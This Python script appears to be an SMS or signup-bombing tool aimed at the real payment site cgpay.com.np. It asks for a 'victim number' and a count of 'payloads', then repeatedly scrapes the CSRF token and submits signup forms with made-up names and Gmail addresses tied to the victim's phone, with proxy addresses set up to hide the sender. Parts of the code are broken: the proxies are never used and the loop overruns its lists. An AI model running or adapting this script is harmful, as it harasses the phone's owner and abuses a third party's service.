from bs4.builder import HTML_5
import requests
from bs4 import BeautifulSoup
url ="https://cgpay.com.np/Home/SignUp"
username =[
    "Chintamani Gartaula",
    "Ramchandra Rumba",
    "Mangal Prajapati",
    "Mukti Syangjali",
    "Mukesh Ranjan",
    "Chudamani Darji",
    "Manjul Kunwer",
    "Ramesh Gadal",
    "Ambar Byanju",
    "Biswa Jamarkattel"

]
lastname = [
    "Gartaula",
    "Rumba",
    "Prajapati",
    "Ranjan",
    "Kunwer",
    "Byanju",
    "Gartaula",
    "Jamarkattel",


]

Email = [
    "ChintamaniGartaula@gmail.com",
    "RamchandraRumba@gmail.com",
    "MangalPrajapati@gmail.com",
    "MuktiSyangjali@gmail.com",
    "MukeshRanjan@gmail.com",
    "ChudamaniDarji@gmail.com",
    "ManjulKunwer@gmail.com",
    "RameshGadal@gmail.com",
    "AmbarByanju@gmail.com",
    "BiswaJamarkattel@gmail.com"
]

number =input('Please enter the victim number \n')
nth =input('Please enter the Number of  payloads to send \n')

r = requests.session()
r.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'})

proxies = {
    'http': 'http://200.29.148.178:8080',
    'http': 'http://84.54.82.173:3128:',
    'https': 'http://14.139.57.195:23500'
    
    
}


for i in range(int(nth)):
    payload = {'FullName':username[i],'Email':Email[i],'MobileNo':number,'Gender':'Male','submit': 'SignUp'}
    m =r.get('https://cgpay.com.np/Home/SignUp')
    soup =BeautifulSoup(m.content,'html.parser')
    # l= soup.find('input',attrs={'name':'__RequestVerificationToken'})['value']
    payload['__RequestVerificationToken'] =soup.find('input',attrs={'name':'__RequestVerificationToken'})['value']
    print(payload)
    s=r.post("https://cgpay.com.np/Home/Login",data=payload,allow_redirects=True)
    print(s.status_code)
    
